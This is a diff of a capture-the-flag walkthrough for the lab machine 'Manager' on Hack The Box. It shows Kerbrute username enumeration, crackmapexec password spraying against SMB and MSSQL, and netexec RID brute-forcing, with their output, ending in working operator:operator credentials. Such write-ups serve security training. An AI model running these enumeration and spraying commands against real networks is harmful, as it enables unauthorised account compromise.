@@ -263,9 +263,18 @@ PORT      STATE SERVICE       REASON          VERSION
 49767/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
 ```
 
-It appears that we are working with a Domain Controller based on the existence of DNS, Kerberos and LDAP.
+It appears that we are working with a Domain Controller based on the existence of DNS, Kerberos and LDAP. The most likely entry points are going to be either the web server, SMB server, MSSQL server or WinRM.
 
-Given that we are not provided credentials, let's test for usernames using Kerbrute, like so:
+First let's view the web server on port 80.
+
+#### Home page:
+
+```
+```
+
+It seems to be a generic webpage. There is no useful information in the source code, none of the links lead anywhere interesting and there are no version identifiers.
+
+At this point, I think the best course of action is to turn our attention to enumerating usernames with Kerbrute, like so:
 
 #### Download Kerbrute:
 
@@ -273,7 +282,9 @@ Given that we are not provided credentials, let's test for usernames using Kerbr
 wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64
 ```
 
-#### Run Kerbrute:
+After trying various wordlists, we discover the format of the usernames is firstname@manager.htb, searching online we find the best wordlist for this use case is xato-net-10-million-usernames.txt.
+
+#### Run Kerbrute with xato usernames:
 
 ```
 ./kerbrute_linux_amd64 userenum -d manager.htb --dc 10.129.116.131 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
@@ -329,14 +340,116 @@ operator
 jinwoo
 ```
 
-Let's try our credentials against the MSSQL server:
+Let's check for weak userpass combinations against smb:
 
 ```
-crackmapexec mssql 10.129.116.131 -u cut_users.txt -p cut_users.txt --continue-on-success | grep +
+crackmapexec smb 10.129.116.131 -u cut_users.txt -p cut_users.txt --continue-on-success | grep +
 ```
 
 #### Output:
 
 ```
-MSSQL                    10.129.116.131  1433   DC01             [+] manager.htb\operator:operator 
+SMB                      10.129.116.131  445    DC01             [+] manager.htb\operator:operator
 ```
+
+Interesting, now let's check if there are any useful shares with READ access:
+
+#### Running smbclient:
+
+```
+smbclient -L \\\\10.129.116.131\\ -U "operator%operator"
+```
+
+#### Output:
+
+```
+Sharename       Type      Comment
+---------       ----      -------
+ADMIN$          Disk      Remote Admin
+C$              Disk      Default share
+IPC$            IPC       Remote IPC
+NETLOGON        Disk      Logon server share 
+SYSVOL          Disk      Logon server share
+```
+
+Seemingly not, can we brute force the RIDs?
+
+```
+netexec smb 10.129.116.131 -u operator -p operator --rid-brute
+```
+
+#### Result:
+
+```
+SMB         10.129.116.131  445    DC01             1113: MANAGER\Zhong (SidTypeUser)
+SMB         10.129.116.131  445    DC01             1114: MANAGER\Cheng (SidTypeUser)
+SMB         10.129.116.131  445    DC01             1115: MANAGER\Ryan (SidTypeUser)
+SMB         10.129.116.131  445    DC01             1116: MANAGER\Raven (SidTypeUser)
+SMB         10.129.116.131  445    DC01             1117: MANAGER\JinWoo (SidTypeUser)
+SMB         10.129.116.131  445    DC01             1118: MANAGER\ChinHae (SidTypeUser)
+SMB         10.129.116.131  445    DC01             1119: MANAGER\Operator (SidTypeUser)
+```
+
+This tool works because each user account in Windows is given an SID (Security Identifier):
+
+```
+S-1-5-21-111-222-333-500
+```
+
+The final number (500) is called the RID (Relative Identifier). Netexec is iterating through a series of these RIDs, returning the associated username with those that exist.
+
+Moving on, we have access to some new usernames. Lets add these to our username file:
+
+```
+cat rids.txt | cut -d \\ -f 2 | cut -d ' ' -f 1 | sed 's/^[A-Z]/\L&/' >> cut_users.txt
+```
+
+#### Result:
+
+```
+ryan
+guest
+cheng
+raven
+administrator
+operator
+jinwoo
+zhong
+cheng
+ryan
+raven
+jinWoo
+chinHae
+operator
+```
+
+Let us now test the operator:operator credentials against WinRM and MSSQL:
+
+#### WinRM:
+
+```
+crackmapexec winrm 10.129.116.131 -u operator -p operator
+```
+
+#### Output:
+
+```
+WINRM       10.129.116.131  5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:manager.htb) 
+WINRM       10.129.116.131  5985   DC01             [-] manager.htb\operator:operator
+```
+
+#### MSSQL:
+
+```
+crackmapexec mssql 10.129.116.131 -u operator -p operator
+```
+
+#### Output:
+
+```
+MSSQL       10.129.116.131  1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:manager.htb) (EncryptionReq:False) 
+MSSQL       10.129.116.131  1433   DC01             [+] manager.htb\operator:operator
+```
+
+We have found password reuse for the MSSQL service with the operator user. This is very dangerous.
+
